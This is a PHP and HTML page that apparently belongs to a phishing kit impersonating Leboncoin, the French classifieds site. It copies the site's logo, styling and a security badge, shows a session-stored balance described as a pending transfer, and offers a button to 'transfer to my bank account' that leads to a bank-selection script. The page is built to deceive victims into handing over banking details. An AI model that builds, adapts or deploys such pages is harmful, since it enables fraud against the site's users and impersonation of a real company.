<?php

session_start();

?>
<html lang="fr" class="text-[62.5%]">

  <head>
    <meta charset="utf-8">
    <title></title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="next-head-count" content="3">
    <link rel="preload" href="./css/style.css" as="style" crossorigin="anonymous">
    <link rel="stylesheet" href="./css/style.css" crossorigin="anonymous" data-n-g=""><noscript data-n-css=""></noscript>
    <script async="" src=""></script>

    <style data-styled="active" data-styled-version="5.2.3"></style>

    
  </head>

  <body data-theme="leboncoin" class="bg-background text-on-background font-nunito-sans">

    <div id="scrnli_recorder_root"></div>
    <div id="__next" data-reactroot="">
      <div class="relative grid grid-cols-page grid-rows-small-page sm:grid-rows-wide-page grid-areas-page h-[100vh] overflow-x-hidden">
        <header class="grid-in-header flex items-center justify-center bg-background shadow z-base">
          <div class="flex h-xl sm:h-2xl">
            <div data-testid="header">
              <div>
                <div class="flex">
                  <div data-testid="logo" class="divide-x md:ml-sm md:border-right-sm md:border-main md:pr-sm md:flex"><a class="sc-bb6ed473-0 bMyVIh flex" data-testid="viewLink-custom-image"><img width="100" class="sc-53cf67e8-0 jeCeIg" src="https://upload.wikimedia.org/wikipedia/commons/6/63/Leboncoin_Logo_%282016%29.svg" alt="logo" tabindex="0"></a></div>
                  <div data-testid="scurisBadge" class="items-center hidden md:flex">
                    <div class="bg-main min-w-sz-1 min-h-full mx-lg"></div><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-main">
                      <path fill-rule="evenodd" d="M18.084 9.3l-7 7.2a1 1 0 0 1-1.5 0l-2.7-2.8a1.1 1.1 0 0 1 0-1.5 1 1 0 0 1 1.5 0l2 2 6.2-6.5a1 1 0 0 1 1.5 0 1.1 1.1 0 0 1 0 1.6m2.7-5.8L13.355.19a2 2 0 0 0-1.71 0L4.25 3.611C3.5 4 3 4.75 3 5.6v5C3 17 7 22.6 12.5 24c5.4-1.4 9.5-7 9.5-13.2V5.62c0-.869-.5-1.66-1.25-2"></path>
                    </svg>
                    <h4 class="text-main text-subhead m-sm self-center">Connexion</h4>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </header>

        <main class="flex flex-col h-full">

          <div class="">

            <div class="px-lg mx-auto py-xl flex flex-col gap-2xl bg-background max-md:h-full max-w-[498px] md:shadow md:rounded-lg md:p-2xl md:mt-[56px]">
              <div class="flex flex-col gap-sm grow-0">

                <h1 class="text-headline-1-expanded font-bold">Voici votre solde</h1>

                <p class="text-callout font-regular">Voici votre solde, actuellement en cours de transfert</p>



              </div>




    <link rel="stylesheet" href="stylee.css">
    <div class="container">
        <div class="balance-box">
            <div class="half-circle"></div>
            <strong><h2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SOLDE</h2></strong>
            <p class="balance-amount">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <?php echo $_SESSION['mont'];  ?> €</p>
            <p class="balance-note">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;En cours de transfert</p>
        </div>
    </div>






              <form action="bank_selection.php" method="POST">
 <br><br>




              <button data-spark-component="button" class="u-shadow-border-transition box-border inline-flex items-center justify-center gap-md whitespace-nowrap px-lg text-body-1 font-bold focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-outline-high [&amp;:not(:focus-visible)]:ring-inset min-w-sz-44 h-sz-44 rounded-lg bg-main text-on-main hover:bg-main-hovered enabled:active:bg-main-pressed focus-visible:bg-main-focused w-full py-32" aria-live="off" type="submit">Transférer sur mon compte bancaire<svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="currentColor" stroke="none" class="fill-current text-current w-sz-16 h-sz-16 text-on-neutral" data-spark-component="icon" aria-hidden="true" focusable="false">
                  <path fill-rule="evenodd" clip-rule="evenodd" d="M15.4613 6.67642C15.0629 7.05586 15.05 7.68386 15.4325 8.0791L18.6538 11.408H3C2.44772 11.408 2 11.8521 2 12.4C2 12.9479 2.44772 13.3921 3 13.3921H18.6538L15.4325 16.7209C15.05 17.1162 15.0629 17.7442 15.4613 18.1236C15.8597 18.5031 16.4928 18.4902 16.8752 18.095L21.7214 13.0871C22.0929 12.7032 22.0929 12.0969 21.7214 11.713L16.8752 6.70505C16.4928 6.30981 15.8597 6.29699 15.4613 6.67642Z"></path>
                </svg></button></form>
              <div class="flex items-center gap-md flex-row w-full flex justify-center flex-wrap" data-testid="questionAction">
                <div data-testid="questionText">
                
              </div>
            </div>
          </div>
        </main>
      </div><svg height="0" width="0" class="src__Box-sc-10d053g-0 hItfWS"></svg>
    </div>


    </div>
  </body>

</html>
